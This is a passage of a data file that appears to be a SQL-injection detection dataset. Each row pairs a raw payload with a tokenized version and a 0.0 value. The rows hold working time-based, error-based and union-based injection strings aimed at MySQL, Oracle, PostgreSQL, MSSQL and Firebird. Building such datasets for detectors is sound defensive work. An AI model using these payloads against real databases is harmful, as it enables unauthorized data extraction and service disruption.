"5854"|"1' where 5786 = 5786 and elt ( 1210 = 1210,sleep ( 5 ) ) --","__INT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , sleep ( __INT__ ) ) - -","","","0.0"
"5855"|"select * from users WHERE username = ""1\' ) ) ) or username = ""-6036 ) ) ) and ( ( ( 6723 = 6723""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ) and ( ( ( __INT__ = __INT__","","","0.0"
"5856"|"-3632' or make_set ( 9354 = 9354,7185 ) and 'lgpy' like 'lgpy","- __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5857"|"select * from users WHERE username = ""1\' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-6661\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )","","","0.0"
"5858"|"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ) and __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )","","","0.0"
"5859"|"select case when 8975 = 2352 then 1 else null end--","select case when __INT__ = __INT__ then __INT__ else null end - -","","","0.0"
"5860"|"1"" ) as uuth where 8555 = 8555 union all select null,null#","__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null","","","0.0"
"5861"|"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" or username = ""1%\' and \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5862"|"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__","","","0.0"
"5863"|"-8869"" where 3019 = 3019 union all select 3019,3019,3019#","- __INT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__","","","0.0"
"5864"|"select * from users WHERE username = ""-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__","","","0.0"
"5865"|"select * from users WHERE username = ""1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5866"|"1 where 1519 = 1519","__INT__ where __INT__ = __INT__","","","0.0"
"5867"|"1' ) ) rlike ( select ( case when ( 6205 = 1384 ) then 1 else 0x28 end ) ) and ( ( 'ahjf' = 'ahjf","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5868"|"select * from users WHERE username = ""-7710\' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5869"|"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""utlk"" like ""utlk","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5870"|"select * from users WHERE username = ""1%\' ) ) ) and username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__","","","0.0"
"5871"|"-3505"" ) or 5290 = 3436--","- __INT__ ) or __INT__ = __INT__ - -","","","0.0"
"5872"|"-4960' ) union all select 5300--","- __INT__ ) union all select __INT__ - -","","","0.0"
"5873"|"select * from users WHERE username = ""1"" or username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ __STR__ ) ) ) | | __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )","","","0.0"
"5874"|"1'|| ( select 'vdeo' where 4355 = 4355","__INT__ __STR__ __IDENT__ where __INT__ = __INT__","","","0.0"
"5875"|"select * from users WHERE username = ""1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ) and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ )","","","0.0"
"5876"|"select * from users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) and ( ( \'opyp\' = \'opyp""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5877"|"select * from users WHERE username = ""1\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'cbwx\' = \'cbwx"" and username = ""1 ) ) as dgso where 4654 = 4654","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5878"|"1' ) where 7887 = 7887 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","__INT__ ) where __INT__ = __INT__ and __IDENT__ ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ ) , __INT__ ) - -","","","0.0"
"5879"|"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and ( ( ( 1248 = 1248"" or username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and ( ( ( __INT__ = __INT__ __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - - ""","","","0.0"
"5880"|"-8809'|| ( select 'hyzr' where 5694 = 5694 union all select 5694--","- __INT__ __STR__ __IDENT__ where __INT__ = __INT__ union all select __INT__ - -","","","0.0"
"5881"|"select * from users WHERE username = ""-5751 ) as jybu where 4739 = 4739 or username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ % \ __STR__ % \ __STR__ ""","","","0.0"
"5882"|"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and username = ""-1985 ) ) ) or username = ""-6665\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'winx\' = \'winx""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5883"|"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'nsji' = 'nsji","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5884"|"select * from users WHERE username = ""1"" and username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1%\'","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = __INT__ % __IDENT__","","","0.0"
"5885"|"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5886"|"select * from users WHERE username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'fnwx\' = \'fnwx"" and username = ""1\' ) ) as plbt where 4368 = 4368","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5887"|"select * from users WHERE username = ""1\'+ ( select \'pvej\' where 4496 = 4496 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-3899\' ) where 8152 = 8152","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) where __INT__ = __INT__","","","0.0"
"5888"|"1"" ) where 1001 = 1001 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","__INT__ ) where __INT__ = __INT__ __IDENT__ __IDENT__ ( __IDENT__ ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , md5 ( __HEX__ ) ) ) ) ) , __INT__ ) #","","","0.0"
"5889"|"1' ) ) ) and 7401 = 9838#","__INT__ ) ) ) and __INT__ = __INT__","","","0.0"
"5890"|"SELECT * FROM users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 OR username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5891"|"1' ) where 3572 = 3572","__INT__ ) where __INT__ = __INT__","","","0.0"
"5892"|"select * from users WHERE username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 or username = ""-8163 ) ) as cvai where 2360 = 2360","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5893"|"select * from users WHERE username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 )","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ )","","","0.0"
"5894"|"select * from users WHERE username = ""-1254"" and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ or __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - ""","","","0.0"
"5895"|"1 where 7642 = 7642 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --","__INT__ where __INT__ = __INT__ or __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) - -","","","0.0"
"5896"|"select * from users WHERE username = ""-4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-3880 ) and username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ % \ __STR__ % \ __STR__ ""","","","0.0"
"5897"|"1%' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '","__INT__ % __STR__ % __STR__","","","0.0"
"5898"|"select * from users WHERE username = ""1"" or username = ""-3424\' ) ) or username = ""-6523"" and username = ""-6720\' ) ) ) and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ __STR__ ) ) ) and __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )","","","0.0"
"5899"|"-3535%' ) ) ) or 5605 = 4660 and ( ( ( '%' = '","- __INT__ % __STR__ % __STR__","","","0.0"
"5900"|"select * from users WHERE username = ""1\' ) and username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-2992\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) )","","","0.0"
